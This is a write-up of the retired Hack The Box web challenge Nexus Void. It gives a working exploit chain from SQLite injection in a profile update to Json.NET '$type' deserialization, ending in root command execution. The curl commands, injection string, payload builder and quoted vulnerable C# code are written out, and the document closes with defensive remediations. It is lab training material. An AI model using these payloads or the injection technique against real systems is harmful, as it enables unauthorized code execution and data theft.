---
title: "Hack The Box Challenge — Nexus Void"
summary: "Nexus Void chains scoped SQLite injection with unsafe Json.NET type handling to instantiate a command-running setter and achieve root code execution."
platform: "Hack The Box"
contentType: "challenge"
publicationPolicy: "retired"
challengeCategory: "Web"
difficulty: "Medium"
solvedAt: 2026-09-11
publishedAt: 2026-09-11
tags:
  - web-security
  - sql-injection
  - unsafe-deserialization
  - dotnet
  - json-net
  - remote-code-execution
  - source-code-review
tools:
  - tree
  - sed
  - grep
  - curl
  - base64
  - jq
cves: []
htbUrl: "https://app.hackthebox.com/challenges/Nexus%2520Void"
featured: false
draft: false
---

> **Authorized-lab notice:** This write-up documents the retired Hack The Box Challenge Nexus Void. Its retired status was reconfirmed on 11 September 2026 by locating it in the HTB Challenges archive with the **Retired** tab selected. The real flag, authentication tokens, generated credentials, temporary target address and unrelated personal information have been removed. The original challenge package is not redistributed.

More retired Hack The Box material is available in the [write-ups archive](/writeups/) and the focused [Challenges archive](/writeups/challenges/).

## Executive summary

Nexus Void is an ASP.NET Core application backed by SQLite. Source review exposed several raw SQL queries built through string interpolation, but SQL injection alone did not explain the challenge's custom serialization helpers. Wishlist records store Base64-encoded Json.NET data, and the application deserializes that data with `TypeNameHandling.All` through an untyped `JsonConvert.DeserializeObject()` call.

The decisive gadget was already present in the application: assigning `StatusCheckHelper.command` starts `/bin/bash -c` with the supplied value. I registered a normal account, created a wishlist row, then used the profile update's stacked SQL injection to replace only my wishlist data with a Base64-encoded `StatusCheckHelper` object. Visiting the wishlist instantiated that type and invoked its command setter. A harmless `id` command first proved code execution as `root`; a second payload recovered the challenge flag, which HTB accepted. The flag itself is omitted.

## Challenge information

| Item | Value |
| --- | --- |
| Name | `Nexus Void` |
| Platform | Hack The Box |
| Category | Web |
| Difficulty | Medium |
| Status | Retired, reconfirmed 11 September 2026 |
| Released | 1 March 2024 |
| Core chain | SQLite injection → stored Json.NET payload → command-executing setter → root RCE |

The scenario presents a black-market storefront selling fictional weapons, including the Serum XY Scourgecaster. The exposed functionality consists of registration, login, product browsing, a wishlist and profile settings.

## Provided material and evidence boundaries

The challenge supplied an ephemeral HTTP service and a source package for the ASP.NET Core application. The extracted project contained the important areas below:

```text
web_nexus_void/
├── build-docker.sh
├── config/
│   └── supervisord.conf
├── flag.txt
└── Nexus_Void/
    ├── Controllers/
    │   ├── HomeController.cs
    │   └── LoginController.cs
    ├── Helpers/
    │   ├── EncodeHelper.cs
    │   ├── JWTHelper.cs
    │   ├── SerializeHelper.cs
    │   └── StatusCheckHelper.cs
    ├── Middleware/JWTMiddleware.cs
    ├── Models/
    ├── Views/
    └── Program.cs
```

The original archive and application source are not included in this repository. Only short excerpts needed to explain the vulnerability are reproduced. The preserved evidence includes the source-review transcript, the exact sanitized request sequence, relevant HTTP statuses, the successful wishlist insertion, the root execution proof and the HTB completion state.

The remote address is represented as `<TARGET>`, generated account data as `<USERNAME>` and `<PASSWORD>`, tokens as `<REDACTED_TOKEN>`, and the final value as `<REDACTED_FLAG>`.

## Initial analysis

The first page was a conventional username and password form with a registration link. Because source code was available, I prioritized tracing trust boundaries over broad automated scanning. The initial file inventory suggested three areas worth connecting:

- Raw Entity Framework Core SQL in the login and home controllers.
- A custom JWT middleware that carries the user ID and username between requests.
- Custom Json.NET serialization and a process-based status helper.

The relevant files were printed in small groups so that the input sources and dangerous sinks could be compared directly:

```bash
for f in \
  Controllers/LoginController.cs \
  Controllers/HomeController.cs \
  Helpers/JWTHelper.cs \
  Helpers/SerializeHelper.cs \
  Helpers/StatusCheckHelper.cs \
  Middleware/JWTMiddleware.cs
do
    echo "===== $f ====="
    sed -n '1,260p' "$f"
done
```

This review showed that `/home` routes require a signed `Token` cookie. The middleware validates the signature and then copies the `username` and `ID` claims into `HttpContext.Items`. Forging a token was unnecessary because registration provided a legitimate account and the application itself issued a valid token.

## Identifying the weakness

### SQL injection in the profile update

The profile settings action places the submitted username directly into an executable SQL string:

```csharp
[HttpPost]
public IActionResult Setting(UserModel user)
{
    string ID = HttpContext.Items["ID"].ToString();
    JWTHelper jwt = new JWTHelper(_configuration);

    string jwtToken = jwt.GenerateJwtToken(user.username, ID);

    string sqlQuery = $"UPDATE Users SET username='{user.username}' WHERE ID={ID}";
    _db.Database.ExecuteSqlRaw(sqlQuery);

    Response.Cookies.Append("Token", jwtToken);
    return View();
}
```

`ExecuteSqlRaw()` receives the already-interpolated string, so quotes, semicolons and SQL comments from `user.username` retain their syntactic meaning. Login and registration contain similar raw constructions, but the settings endpoint offered the shortest route to an authenticated write primitive.

### Attacker-reachable wishlist deserialization

The wishlist GET action retrieves serialized data from SQLite and immediately deserializes it:

```csharp
if (wishlist != null && !string.IsNullOrEmpty(wishlist.data))
{
    List<ProductModel> products = SerializeHelper.Deserialize(wishlist.data);
    return View(products);
}
```

`SerializeHelper` performs Base64 decoding before enabling Json.NET type metadata:

```csharp
public static List<ProductModel> Deserialize(string str)
{
    string decodedData = EncodeHelper.Decode(str);

    var deserialized = JsonConvert.DeserializeObject(decodedData,
        new JsonSerializerSettings
        {
            TypeNameHandling = TypeNameHandling.All
        });

    return deserialized as List<ProductModel>;
}
```

Base64 only transports the JSON; it does not establish integrity or trust. More importantly, the untyped `DeserializeObject()` overload allows the JSON `$type` field to select the root .NET type.

### The application-provided command gadget

`StatusCheckHelper` contains a side effect in its `command` setter:

```csharp
public string command
{
    get { return _command; }
    set
    {
        _command = value;

        var processStartInfo = new ProcessStartInfo()
        {
            FileName = "/bin/bash",
            WorkingDirectory = "/tmp",
            Arguments = $"-c \"{_command}\"",
            RedirectStandardOutput = true,
            RedirectStandardError = true,
            UseShellExecute = false
        };

        var p = new Process { StartInfo = processStartInfo };
        p.Start();
        output = p.StandardOutput.ReadToEnd();
    }
}
```

If Json.NET creates this class and assigns `command`, the setter executes before the controller casts the completed object to `List<ProductModel>`. The cast can return `null`; by then the process has already run. This also explains why `ProductModel` did not need an `object`-typed property to host the gadget.

## Chronological solution

### 1. Registering and obtaining a legitimate JWT

A unique normal account was created and logged in with `curl`. The cookie jar retained the server-generated JWT without exposing it in later commands:

```bash
TARGET='http://<TARGET>'
LAB_USER='<USERNAME>'
LAB_PASS='<PASSWORD>'
COOKIE='/tmp/nexus_void.cookies'

curl -sS -i -X POST "$TARGET/Login/Create" \
  --data-urlencode "username=$LAB_USER" \
  --data-urlencode "password=$LAB_PASS"

curl -sS -i -c "$COOKIE" -X POST "$TARGET/Login/Index" \
  --data-urlencode "username=$LAB_USER" \
  --data-urlencode "password=$LAB_PASS"
```

Registration returned `HTTP/1.1 200 OK`. Login produced the expected authenticated transition:

```http
HTTP/1.1 302 Found
Location: /home/
Set-Cookie: Token=<REDACTED_TOKEN>; path=/
```

The issued token contained user ID `1` in this fresh challenge instance. The real token is omitted.

### 2. Creating a wishlist row

The exploit needed a record that could be overwritten and later loaded by the same authenticated ID. Adding a known seeded product created it through normal application behavior:

```bash
curl -sS -i -b "$COOKIE" -X POST "$TARGET/Home/Wishlist" \
  --data-urlencode 'name=Shadowcaster MK VI' \
  --data-urlencode 'sellerName=Xclow3n'
```

The server returned:

```text
HTTP/1.1 200 OK

Added
```

A GET request to `/Home/Wishlist` contained `Shadowcaster MK VI`, confirming that the row existed and was associated with the current user.

### 3. Confirming the deployed web root

The extracted directory did not expose a Dockerfile at the expected path, so I checked the available Supervisor configuration rather than guessing where the application ran:

```bash
sed -n '1,240p' config/supervisord.conf
```

The relevant lines were:

```ini
[program:dotnet]
command=dotnet Nexus_Void.dll
directory=/app
```

ASP.NET Core serves static assets from the project's `wwwroot` directory. With the application running in `/app`, `/app/wwwroot/proof.txt` provided a simple same-host method for observing command output without relying on an external callback service.

### 4. Building a harmless deserialization payload

The first payload executed only `id` and wrote its output to the static directory:

```bash
PAYLOAD_JSON='{"$type":"Nexus_Void.Helpers.StatusCheckHelper, Nexus_Void","command":"id > /app/wwwroot/proof.txt"}'
PAYLOAD_B64=$(printf '%s' "$PAYLOAD_JSON" | base64 -w0)
```

The `$type` metadata names the helper and its application assembly. Json.NET constructs that type, then assigns `command`, invoking the dangerous setter.

### 5. Replacing only the current user's wishlist data

The injected username closed the application's quoted value, completed a harmless update scoped to the current account, then added a second update scoped to the matching wishlist username:

```text
<USERNAME>' WHERE username='<USERNAME>';
UPDATE Wishlist SET data='<BASE64_PAYLOAD>'
WHERE username='<USERNAME>';--
```

Scoping both statements was deliberate: an unrestricted stacked query could modify other players' rows on a shared challenge instance. The payload was delivered through the vulnerable settings form:

```bash
INJECT="${LAB_USER}' WHERE username='${LAB_USER}'; UPDATE Wishlist SET data='${PAYLOAD_B64}' WHERE username='${LAB_USER}';--"

curl -sS -i -b "$COOKIE" -c "$COOKIE" \
  -X POST "$TARGET/Home/Setting" \
  --data-urlencode "username=$INJECT"
```

The response was `HTTP/1.1 200 OK` and issued a refreshed JWT. The user ID claim remained valid, so the next wishlist request still selected the attacker's own record.

### 6. Triggering and proving command execution

Loading the wishlist activated the deserializer:

```bash
curl -sS -i -b "$COOKIE" "$TARGET/Home/Wishlist"
curl -sS -i "$TARGET/proof.txt"
```

The first response remained `200 OK`. The proof file then showed:

```text
uid=0(root) gid=0(root) groups=0(root),1(bin),2(daemon),3(sys),4(adm),...
```

This was the key validation point: attacker-controlled database content had crossed into Json.NET type construction and reached operating-system command execution as `root`.

### 7. Recovering and validating the flag

After the harmless proof, the same verified route was reused with a command that copied the challenge flag into a temporary static file:

```bash
FLAG_COMMAND='cat /flag* > /app/wwwroot/nexus_flag.txt 2>/dev/null'

FLAG_JSON=$(jq -cn \
  --arg cmd "$FLAG_COMMAND" \
  '{"$type":"Nexus_Void.Helpers.StatusCheckHelper, Nexus_Void","command":$cmd}')

FLAG_B64=$(printf '%s' "$FLAG_JSON" | base64 -w0)
```

The Base64 payload replaced the same wishlist field through the scoped settings injection. A request to `/Home/Wishlist` triggered it, and the resulting static resource returned a correctly formatted HTB value:

```bash
curl -sS "$TARGET/nexus_flag.txt"
```

```text
<REDACTED_FLAG>
```

The value was accepted by Hack The Box, and the challenge page displayed `You have completed the Nexus Void challenge.`

## Minimal exploit sequence

The following sanitized shell sequence preserves the manually verified logic without containing a real target, account, token or flag. It assumes that a normal login and wishlist insertion have already populated `COOKIE` and `LAB_USER`:

```bash
build_payload() {
  jq -cn --arg cmd "$1" \
    '{"$type":"Nexus_Void.Helpers.StatusCheckHelper, Nexus_Void","command":$cmd}' |
    base64 -w0
}

PAYLOAD_B64=$(build_payload 'id > /app/wwwroot/proof.txt')
INJECT="${LAB_USER}' WHERE username='${LAB_USER}'; UPDATE Wishlist SET data='${PAYLOAD_B64}' WHERE username='${LAB_USER}';--"

curl -sS -b "$COOKIE" -c "$COOKIE" \
  -X POST "$TARGET/Home/Setting" \
  --data-urlencode "username=$INJECT" \
  -o /dev/null

curl -sS -b "$COOKIE" "$TARGET/Home/Wishlist" -o /dev/null
curl -sS "$TARGET/proof.txt"
```

This is a sanitized representation of the commands executed during the solve, not a separately packaged exploit artifact.

## Validation

The attack was confirmed at several independent layers:

1. Source code showed direct username interpolation into `ExecuteSqlRaw()`.
2. Source code showed Base64 decoding followed by untyped `TypeNameHandling.All` deserialization.
3. Source code showed the `command` setter invoking `/bin/bash -c`.
4. Normal product insertion returned `Added` and the wishlist displayed the product.
5. The injected payload left `/Home/Wishlist` responding with `200 OK`.
6. `/proof.txt` reported `uid=0(root)`.
7. The final response had HTB flag syntax and solved the challenge on the platform.

The real flag, partial flag values, JWTs, generated credentials and live endpoint have been removed.

## Investigative branch: the apparent list constraint

At first, returning `List<ProductModel>` appeared to require placing a gadget somewhere inside a product. Inspecting `ProductModel` showed only scalar fields and no flexible `object` property, making that approach look incompatible.

The important distinction was the order of operations. `JsonConvert.DeserializeObject(decodedData, settings)` has no declared target type. Json.NET therefore honors the root `$type`, constructs `StatusCheckHelper` and assigns its properties. Only after deserialization does the application attempt:

```csharp
deserialized as List<ProductModel>
```

That cast returns `null`, but it cannot undo a setter that already executed. Checking the exact overload and data flow avoided the unnecessary search for a generic framework gadget.

## Comparison with the official route

The official write-up was supplied and reviewed only after the challenge had been solved. It confirmed the same high-level chain—SQL injection, attacker-controlled wishlist serialization, `TypeNameHandling.All` and the `StatusCheckHelper.command` setter—but used a different injection path.

Its route uses a `UNION SELECT` during login to make the application sign a malicious username into the JWT. When a product is added, that username reaches the wishlist `INSERT` and places the serialized payload into the database. It then uses an outbound `wget` request to carry the flag to a callback endpoint.

My executed route instead used the authenticated profile update to modify my existing wishlist row directly, then wrote command output to `/app/wwwroot` and retrieved it from the same challenge origin. The official material therefore served as post-solve verification, not as a substitute for the recorded solution.

## Why it works

The exploit crosses four trust boundaries:

1. **HTTP input becomes SQL syntax.** String interpolation lets the profile username terminate a value and append another SQLite statement.
2. **Database content is treated as trusted serialized state.** The application assumes that wishlist data could only have been created by its own serializer.
3. **Type metadata becomes executable object construction.** `TypeNameHandling.All` allows `$type` to select an application class when no restrictive binder is present.
4. **A data property has an operating-system side effect.** Assigning `command` starts Bash, turning ordinary property population into RCE.

Base64 is irrelevant to the security boundary because the application decodes it immediately. JWT validation also does not help: the attack begins with an account and token legitimately issued by the application. Running the service as root raises the final impact from application-level code execution to root command execution inside the container.

## Defensive perspective

| Weakness | Defensive action |
| --- | --- |
| User values interpolated into `FromSqlRaw()` and `ExecuteSqlRaw()` | Use normal EF Core queries/updates or parameterized APIs; never assemble SQL values with string interpolation |
| Serialized wishlist stored as opaque Base64 | Store normalized product identifiers or validate authenticated server-generated data with integrity protection |
| `TypeNameHandling.All` on attacker-influenced data | Prefer `TypeNameHandling.None` and deserialize into `List<ProductModel>` explicitly; if polymorphism is unavoidable, enforce a strict allow-list binder |
| Process execution inside a property setter | Keep model setters free of side effects and expose only fixed, server-selected health checks |
| Application runs as root | Use an unprivileged container user, read-only application files and a non-writable static asset directory |
| Little visibility into payload tampering | Alert on SQL metacharacters in profile fields, unexpected `$type` metadata and new files appearing under `wwwroot` |

Parameterized SQL is the primary repair for the injection, while removing unsafe polymorphic deserialization breaks the code-execution bridge even if database content is modified through another flaw. Defense in depth matters because fixing only the command helper would leave arbitrary database modification intact.

## Key takeaways

- White-box web testing is most effective when inputs are traced across components rather than reviewing each vulnerable-looking line in isolation.
- A valid JWT authenticates who supplied a request; it does not make the authenticated fields safe for SQL construction.
- Encoded data is not trusted data. Base64 provides no authenticity, authorization or type safety.
- Json.NET type metadata can instantiate application-local gadgets, so exploitation does not always require a well-known framework gadget chain.
- Side effects in property setters create dangerous deserialization behavior because setters run while objects are being populated.
- A harmless command such as `id` provides a clean RCE proof before accessing the challenge objective.
- Scope destructive test queries to the current lab account, even on an authorized shared platform.

## References

- [Hack The Box — Nexus Void](https://app.hackthebox.com/challenges/Nexus%2520Void)
- Hack The Box official Nexus Void write-up, reviewed after the solve through the retired challenge page
- [Json.NET — Serialization Settings](https://www.newtonsoft.com/json/help/html/SerializationSettings.htm)
- [Microsoft Learn — SQL Queries in EF Core](https://learn.microsoft.com/en-us/ef/core/querying/sql-queries)
- [OWASP — SQL Injection Prevention Cheat Sheet](https://cheatsheetseries.owasp.org/cheatsheets/SQL_Injection_Prevention_Cheat_Sheet.html)
- [OWASP — Deserialization Cheat Sheet](https://cheatsheetseries.owasp.org/cheatsheets/Deserialization_Cheat_Sheet.html)
